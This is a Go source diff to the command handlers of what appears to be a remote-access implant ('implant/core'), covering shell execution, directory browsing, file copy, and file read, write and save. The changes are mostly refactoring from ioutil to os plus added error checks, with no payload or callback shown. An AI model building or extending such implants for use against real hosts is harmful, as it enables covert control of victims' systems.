@@ -13,7 +13,6 @@ import (
 	"implant/core/sysinfo"
 	"implant/core/utils"
 	"io"
-	"io/ioutil"
 	"math/big"
 	"os"
 	"path/filepath"
@@ -72,7 +71,6 @@ func CmdShell(cmdBuf []byte) ([]byte, error) {
 		if err != nil {
 			communication.ErrorProcess(err)
 		}
-		return
 	}()
 	return []byte("[+] command is executing"), nil
 }
@@ -250,13 +248,17 @@ func CmdFileBrowse(dirPathBytes []byte) ([]byte, error) {
 	resultBuilder.WriteString(fmt.Sprintf("\nD\t0\t%s\t-rwxr-xr-x\t..", modTimeStr))
 
 	// 读取目录中的文件
-	files, err := ioutil.ReadDir(dirPathStr)
+	entries, err := os.ReadDir(dirPathStr)
 	if err != nil {
 		return nil, fmt.Errorf("读取目录失败: %v", err)
 	}
 
 	// 优化文件处理循环
-	for _, file := range files {
+	for _, entry := range entries {
+		file, err := entry.Info()
+		if err != nil {
+			continue // 竞态删除的条目跳过
+		}
 		// 优化时间格式化
 		fileModTime := file.ModTime().Format("02/01/2006 15:04:05")
 
@@ -306,6 +308,9 @@ func CmdSleep(cmdBuf []byte) ([]byte, error) {
 
 func CmdPwd() ([]byte, error) {
 	pwd, err := os.Getwd()
+	if err != nil {
+		return nil, err
+	}
 	result, err := filepath.Abs(pwd)
 	if err != nil {
 		return nil, err
@@ -433,7 +438,7 @@ func CmdCp(cmdBuf []byte) ([]byte, error) {
 		return nil, err
 	}
 	dest := string(arg)
-	bytesRead, err := ioutil.ReadFile(src)
+	bytesRead, err := os.ReadFile(src)
 	if err != nil {
 		return nil, err
 	}
@@ -634,7 +639,7 @@ func CmdFileSave(cmdBuf []byte) ([]byte, error) {
 	fileContent := body[4+pathLen:]
 
 	// 创建或覆盖文件
-	err := ioutil.WriteFile(filePath, fileContent, 0644)
+	err := os.WriteFile(filePath, fileContent, 0644)
 	if err != nil {
 		return fileOpResult(requestId, false, "Failed to save file: "+err.Error()), nil
 	}
@@ -688,7 +693,7 @@ func CmdFileEditRead(cmdBuf []byte) ([]byte, error) {
 	filePath := string(body[4 : 4+pathLen])
 
 	// 读取文件内容
-	fileContent, err := ioutil.ReadFile(filePath)
+	fileContent, err := os.ReadFile(filePath)
 	if err != nil {
 		// 返回错误响应：失败标志 + 错误信息
 		errorMsg := "Failed to read file: " + err.Error()
@@ -734,7 +739,7 @@ func CmdFileEditWrite(cmdBuf []byte) ([]byte, error) {
 	fileContent := body[4+pathLen:]
 
 	// 写入文件
-	err := ioutil.WriteFile(filePath, fileContent, 0644)
+	err := os.WriteFile(filePath, fileContent, 0644)
 	if err != nil {
 		// 返回错误响应：失败标志 + 错误信息
 		errorMsg := "Failed to write file: " + err.Error()
